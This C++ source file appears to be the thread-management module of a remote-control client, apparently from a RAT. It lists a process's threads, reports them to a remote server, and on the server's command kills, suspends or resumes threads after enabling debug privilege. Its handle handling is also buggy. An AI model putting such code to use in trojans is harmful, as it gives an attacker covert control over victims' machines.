#include "ProcessThreadManager.h"


CProcessThreadManager::CProcessThreadManager(_CIOCPClient * IOCPClient) : CManager(IOCPClient)
{
	printf("CProcessThreadManager()\r\n");
}


CProcessThreadManager::~CProcessThreadManager()
{
	printf("~CProcessThreadManager()\r\n");
}


BOOL CProcessThreadManager::SendClientProcessThreaderList()
{
	BOOL IsOk = FALSE;
	char* BufferData = NULL;

	DWORD Offset = 1;
	DWORD v1 = 0;

	vector<THREAD_ITEM_INFORMATION>::iterator i;

	//将vector中的数据写进BufferData
	BufferData = (char*)LocalAlloc(LPTR, 0x10);
	if (BufferData == NULL)
	{
		return IsOk;
	}
	//数据包的第一个字节就是数据包类型
	BufferData[0] = CLIENT_PROCESS_MANAGER_ENUM_THREADER_REPLY;
	for (i = m_ThreadItemInfoVector.begin(); i != m_ThreadItemInfoVector.end(); i++)
	{
		/*
		LONG BasePriority;
		ULONG ContextSwitches;
		KPRIORITY Priority;
		HANDLE    ThreadID;
		ULONG ThreadState;
		ULONG WaitReason;
		ULONG WaitTime;
		PVOID   Teb;
		PVOID   ThreadStartAddress;
		HANDLE  ThreadHandle;
		*/
		//一个信息结构体大小
		v1 = sizeof(LONG) +
			sizeof(ULONG) +
			sizeof(KPRIORITY) +
			sizeof(HANDLE) +
			sizeof(ULONG) +
			sizeof(ULONG) +
			sizeof(ULONG) +
			//lstrlen((LPCSTR)(i->Teb)) +
			//lstrlen((LPCSTR)(i->ThreadStartAddress)) +
			sizeof(HANDLE);

		//BufferData缓冲区小于进程信息结构体大小加一个字节的数据包类型  重新分配
		if (LocalSize(BufferData) < (Offset + v1))
		{
			BufferData = (char*)LocalReAlloc(BufferData, (Offset + v1), LMEM_ZEROINIT | LMEM_MOVEABLE);
		}
		memcpy(BufferData + Offset, &(i->BasePriority), sizeof(LONG));
		Offset += sizeof(LONG);
		memcpy(BufferData + Offset, &(i->ContextSwitches), sizeof(ULONG));
		Offset += sizeof(ULONG);
		memcpy(BufferData + Offset, &(i->Priority), sizeof(KPRIORITY));
		Offset += sizeof(KPRIORITY);
		memcpy(BufferData + Offset, &(i->ThreadID), sizeof(HANDLE));
		Offset += sizeof(HANDLE);
		memcpy(BufferData + Offset, &(i->ThreadState), sizeof(ULONG));
		Offset += sizeof(ULONG);
		memcpy(BufferData + Offset, &(i->WaitReason), sizeof(ULONG));
		Offset += sizeof(ULONG);
		memcpy(BufferData + Offset, &(i->WaitTime), sizeof(ULONG));
		Offset += sizeof(ULONG);
		memcpy(BufferData + Offset, &(i->ThreadHandle), sizeof(HANDLE));
		Offset += sizeof(HANDLE);
	}
	//发送BufferData给服务器
	m_IOCPClient->OnSending(BufferData, LocalSize(BufferData));
	IsOk = TRUE;
	if (BufferData != NULL)
	{
		LocalFree(BufferData);
		BufferData = NULL;
	}
	return IsOk;

}

BOOL CProcessThreadManager::SeEnumThreadInfoByProcessID(HANDLE ProcessID)
{
	if (SeEnumThreadInfoByNtQuerySystemInformation(ProcessID, m_ThreadItemInfoVector) == FALSE)
	{
		return FALSE;
	}
	return (m_ThreadItemInfoVector.size() > 0);
}

VOID CProcessThreadManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_THREADER_MANAGER_REFRESH:
	{
		SendClientProcessThreaderList();
		break;
	}
	case CLIENT_THREADER_MANAGER_KILL_ONE:
	{
		KillThreader((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}
	case CLIENT_THREADER_MANAGER_SUSPEND:
	{
		SuspendThreader((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}
	case CLIENT_THREADER_MANAGER_RESUME:
	{
		ResumeThreader((LPBYTE)BufferData + 1, BufferLength - 1);
		break;
	}


	}

}

VOID CProcessThreadManager::KillThreader(LPBYTE BufferData, UINT BufferLength)
{
	HANDLE ThreadHandle = NULL;
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	for (int i = 0; i < BufferLength; i += 4)//因为结束的可能个不止是一个进程
	{
		DWORD dwExitCode =0;
		memcpy(&ThreadHandle, BufferData +i, 4);
		/*if (!GetExitCodeThread((HANDLE)(BufferData + i), &dwExitCode))
		{
			MessageBox(0, "获取ExitCodeThread失败", "提示", 0);
			return;
		}*/
		if (TerminateThread(ThreadHandle, -1) == NULL)
		{
			MessageBox(0,"TerminateThread(ThreadHandle, dwExitCode) == NULL",0,0);
		}
	}
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);  //还原提权
	Sleep(5);														   // 稍稍Sleep下，防止出错

	BYTE bToken = CLIENT_THREADER_MANAGER_KILL_ONE_REPLY;   //向被控端发送一个COMMAND_SYSTEM
	m_IOCPClient->OnSending((char*)&bToken, sizeof(BYTE));
}

VOID CProcessThreadManager::SuspendThreader(LPBYTE BufferData, UINT BufferLength)
{
	HANDLE ThreadHandle = NULL;
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	for (int i = 0; i < BufferLength; i += 4)//因为结束的可能个不止是一个进程
	{
		memcpy(&ThreadHandle, BufferData + i, 4);
		if (SuspendThread(ThreadHandle) == -1)
		{
			MessageBox(0, "SuspendThread(ThreadHandle) != -1", 0, 0);
			return;
		}
	}
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);  //还原提权
	Sleep(5);														

	BYTE bToken = CLIENT_THREADER_MANAGER_SUSPEND_REPLY;   //向被控端发送一个COMMAND_SYSTEM
	m_IOCPClient->OnSending((char*)&bToken, sizeof(BYTE));
}

VOID CProcessThreadManager::ResumeThreader(LPBYTE BufferData, UINT BufferLength)
{
	HANDLE ThreadHandle = NULL;
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);
	for (int i = 0; i < BufferLength; i += 4)//因为结束的可能个不止是一个进程
	{
		memcpy(&ThreadHandle, BufferData + i, 4);
		if (ResumeThread(ThreadHandle)== -1)
		{
			MessageBox(0, "ResumeThread(ThreadHandle)== -1", 0, 0);
			return;
		}
	}
	EnableSeDebugPrivilege(GetCurrentProcess(), TRUE, SE_DEBUG_NAME);  //还原提权
	Sleep(5);

	BYTE bToken = CLIENT_THREADER_MANAGER_RESUME_REPLY;   //向被控端发送一个COMMAND_SYSTEM
	m_IOCPClient->OnSending((char*)&bToken, sizeof(BYTE));
}